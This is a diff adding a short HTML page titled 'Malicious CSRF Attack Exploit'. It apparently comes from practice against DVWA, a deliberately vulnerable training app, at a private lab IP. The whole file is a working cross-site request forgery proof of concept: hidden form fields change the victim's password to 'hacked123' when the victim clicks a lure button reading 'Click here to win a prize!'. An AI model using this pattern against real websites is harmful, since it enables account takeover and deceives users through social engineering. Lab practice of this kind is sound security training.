@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious CSRF Attack Exploit</title>
+</head>
+<body>
+    <form action="http://192.168.254.129/dvwa/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="hacked123">
+        <input type="hidden" name="password_conf" value="hacked123">
+        <input type="hidden" name="Change" value="Change">
+        <input type="submit" value="Click here to win a prize!">
+    </form>
+</body>
+</html>
